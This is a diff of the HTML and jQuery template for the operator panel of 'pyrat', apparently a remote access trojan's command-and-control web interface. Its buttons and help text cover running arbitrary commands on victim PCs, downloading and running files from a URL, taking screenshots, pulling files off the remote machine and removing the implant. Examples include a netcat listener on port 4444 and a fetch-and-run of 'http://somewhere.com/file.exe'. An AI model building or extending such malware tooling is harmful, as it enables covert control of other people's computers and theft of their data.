@@ -5,102 +5,142 @@
 <head>
     <meta charset="UTF-8">
     <title>:: pyrat :: command center</title>
-    <style> td, th { border: 1px solid black; } </style>
+    <link rel="stylesheet" type="text/css" href="/static/pyrat_server/style.css">
     <script src="https://code.jquery.com/jquery-latest.pack.js" type="text/javascript"></script>
 </head>
 
 <body>
-{% if user.is_authenticated %}
-    <script language="javascript" type="text/javascript">
-       $('document').ready(function(){
-       setInterval(function(){
-        $.ajax({
-          url: "/clients/ #table_cont",
-        }).done(function ( data ) {
-          $("#fresh_table_cont").html(data);
+    <div id="container">
+        {% if user.is_authenticated %}
+            <script language="javascript" type="text/javascript">
+               $('document').ready(function(){
+               setInterval(function(){
+                $.ajax({
+                  url: "/clients/ #table_cont",
+                }).done(function ( data ) {
+                  $("#fresh_table_cont").html(data);
 
-        });
-        }, 10000);
-        });
-    </script>
-    <div align="right">
-    Logged user: <b>{{ user.username }}</b> // <a href="/accounts/logout/">LOGOUT</a>
+                });
+                }, 10000);
+                });
+            </script>
+            <div id="logo">
+                <div align="right">
+                    Logged user: <b>{{ user.username }}</b> // <a href="/accounts/logout/">LOGOUT</a>
+                </div>
+                <pre>
+ ______   __  __     ______     ______     ______
+/\  == \ /\ \_\ \   /\  == \   /\  __ \   /\__  _\
+\ \  _-/ \ \____ \  \ \  __<   \ \  __ \  \/_/\ \/
+ \ \_\    \/\_____\  \ \_\ \_\  \ \_\ \_\    \ \_\
+  \/_/     \/_____/   \/_/ /_/   \/_/\/_/     \/_/
+                </pre>
+            </div>
+                <div class="column_big">
+                    <br>
+                    Insert params
+                    <br>
+                    <br>
+                    <input type ="text" size="80" id="params">
+                    <br>
+                    <br>
+                    Select command:
+                    <input type="hidden" name="command" id="commparams">
+                    <br>
+                    <br>
+                    <button class="button b_delete" id="#deluser"></button>
+                    <button class="button b_popup" id="#popup"></button>
+                    <button class="button b_command" id="#run_command"></button>
+                    <button class="button b_downloader" id="#downloader"></button>
+                    <button class="button b_screenshot" id="#screenshot"></button>
+                    <button class="button b_upload" id="#upload"></button>
+                </div>
+                <div class="column_small">
+                    SHORT HELP:
+                    <br>
+                    <br>
+                    <b>deluser</b> - necessary params: none<br>
+                    <b>popup</b> - necessary params: <i>-t "Window Title" -m "Message to show"</i><br>
+                    <b>run_command</b> - necessary params: command. Optional -timeout xx, where xx is time in seconds.<br>
+                    for example: <i>dir C:\Windows</i> or <i>C:\nc.exe -lvp 4444 -timeout 3600</i><br>
+                    <b>downloader</b> - necessary params: url, path to save. Optional -run if you want to run file after download<br>
+                    for example: <i>http://somewhere.com/file.exe C:\ -run</i><br>
+                    <b>screenshot</b> - necessary params: none<br>
+                    <b>upload</b> - necessary params: path to file on remote PC
+                    for example: <i>C:\Windows\some.log</i>
+                </div>
+                <div class="query_header">
+                    Last command:
+                </div>
+                <div class="query_result">
+                    Waiting for command...
+                </div>
+                <br>
+                <div id="fresh_table_cont">
+                </div>
+            <script type="text/javascript">
+            // Javascript functions, to supervision of user input.
+            // function screenshot and deluser should be without parameters.
+            $(document).ready(function(){
+            $('button').click(function(e){
+            if  (e.target.id != 'params') {
+                if (e.target.id == '#screenshot' || e.target.id =='#deluser') {
+                var idClicked = e.target.id;
+                var finSum = idClicked + '()';
+                }
+                else if (e.target.id == '#popup') {
+                var idClicked = e.target.id;
+                var params = $('#params').val();
+                var winTitle = (params.match(/-t \"(.*)\" /))[1].replace(/ /g, "_");
+                var winMessage = (params.match(/-m \"(.*)\"/))[1].replace(/ /g, "_");
+                var finSum = idClicked + '(' + winTitle + ' ' + winMessage + ')';
+                }
+                else {
+                var idClicked = e.target.id;
+                var params = $('#params').val();
+                    if (params.length == 0) {
+                    alert('For command != screenshot or deluser, you must put some params!');
+                    e.preventDefault();
+                    }
+                    else {
+                    }
+                var finSum = idClicked + '(' + params + ')';
+                }
+            }
+            else {
+            var finSum = '';
+            }
+            // Form-sending using jQuery
+            // Getting necessary values to array and send them using AJAX
+            $('#commparams').val(finSum);
+            var jqCommParams = $('#commparams').val();
+            var jqData = {};
+            jqData["command"] = jqCommParams
+            $('#fresh_table_cont input:checked').each(function() {
+                var a = $(this).attr('name');
+                var b = $(this).attr('value');
+                jqData[a] = b;
+            });
+            // alert(jqData.toSource()); <-- only for test purpose
+            $.ajax({
+                  type: "POST",
+                  url: "/command/",
+                  data: jqData,
+                  cache: false,
+                  success: function(data){
+                     $(".query_result").text(data);
+                  }
+                });
+                $('#commparams').val('')
+                $('#params').val('')
+            });
+            });
+            </script>
+        {% else %}
+            User not authenticated.
+            <br>
+            <a href="/accounts/login/">CLICK TO LOGIN</a>
+        {% endif %}
     </div>
-    <div align="center" id="logo">
-<pre>
- .----------------.  .----------------.  .----------------.  .----------------.  .----------------.
-| .--------------. || .--------------. || .--------------. || .--------------. || .--------------. |
-| |   ______     | || |  ____  ____  | || |  _______     | || |      __      | || |  _________   | |
-| |  |_   __ \   | || | |_  _||_  _| | || | |_   __ \    | || |     /  \     | || | |  _   _  |  | |
-| |    | |__) |  | || |   \ \  / /   | || |   | |__) |   | || |    / /\ \    | || | |_/ | | \_|  | |
-| |    |  ___/   | || |    \ \/ /    | || |   |  __ /    | || |   / ____ \   | || |     | |      | |
-| |   _| |_      | || |    _|  |_    | || |  _| |  \ \_  | || | _/ /    \ \_ | || |    _| |_     | |
-| |  |_____|     | || |   |______|   | || | |____| |___| | || ||____|  |____|| || |   |_____|    | |
-| |              | || |              | || |              | || |              | || |              | |
-| '--------------' || '--------------' || '--------------' || '--------------' || '--------------' |
- '----------------'  '----------------'  '----------------'  '----------------'  '----------------'
-</pre>
-    </div>
-    <br>
-	Insert params
-	<br>
-    <br>
-	<input type ="text" name="params" size="100" id="params">
-	<br>
-    <br>
-	Select command:
-	<form action="/command/" method="post" target="_blank" id="kurwa">
-	<input type="hidden" name="command" size="100" id="command"> 
-	<br>
-	<br>
-	<input type="image" id="#deluser" src="/static/pyrat_server/img/delete.png" alt="submit Button" hspace="20" title="#deluser"
-           onMouseOut="this.src='/static/pyrat_server/img/delete.png'" onMouseOver="this.src='/static/pyrat_server/img/delete_bl.png'">
-	<input type="image" id="#popup" src="/static/pyrat_server/img/popup.png" alt="submit Button" hspace="20" title="#popup($Title,$Text)"
-           onMouseOut="this.src='/static/pyrat_server/img/popup.png'" onMouseOver="this.src='/static/pyrat_server/img/popup_bl.png'">
-	<input type="image" id="#run_command" src="/static/pyrat_server/img/command.png" alt="submit Button" hspace="20" title="#run_command($C:\windows\system32\cmd.exe,$/C,$Command,$Param) [use \\ for slash]"
-           onMouseOut="this.src='/static/pyrat_server/img/command.png'" onMouseOver="this.src='/static/pyrat_server/img/command_bl.png'">
-	<input type="image" id="#downloader" src="/static/pyrat_server/img/downloader.png" alt="submit Button" hspace="20" title="#downloader($Url,$Path,$Y)"
-           onMouseOut="this.src='/static/pyrat_server/img/downloader.png'" onMouseOver="this.src='/static/pyrat_server/img/downloader_bl.png'">
-	<input type="image" id="#screenshot" src="/static/pyrat_server/img/screenshot.png" alt="submit Button" hspace="20" title="#screenshot()"
-           onMouseOut="this.src='/static/pyrat_server/img/screenshot.png'" onMouseOver="this.src='/static/pyrat_server/img/screenshot_bl.png'">
-	<input type="image" id="#upload" src="/static/pyrat_server/img/upload.png" alt="submit Button" hspace="20" title="#upload($Path)"
-           onMouseOut="this.src='/static/pyrat_server/img/upload.png'" onMouseOver="this.src='/static/pyrat_server/img/upload_bl.png'">
-        <br>
-        <br>
-        <div id="fresh_table_cont"></div>
-    </form>
-	<script type="text/javascript">
-	$(document).ready(function(){
-	$('input').click(function(e){
-	if  (e.target.id != 'params') {
-		if (e.target.id == '#screenshot' || e.target.id =='#deluser') {
-		var idClicked = e.target.id;
-		var suma = idClicked + '()';
-		}
-		else {
-		var idClicked = e.target.id;
-		var params = $('#params').val();
-			if (params.length == 0) {
-			alert('For command != screenshot or deluser, you must put some params!');
-			e.preventDefault();
-			}
-			else {
-			}
-		var suma = idClicked + '(' + params + ')';
-		}
-	}
-	else {
-	var suma = '';
-	}
-    $('#command').val(suma);
-    });
-    });
-	</script>
-{% else %}
-    User not authenticated.
-    <br>
-    <a href="/accounts/login/">CLICK TO LOGIN</a>
-{% endif %}
 </body>
-
 </html>
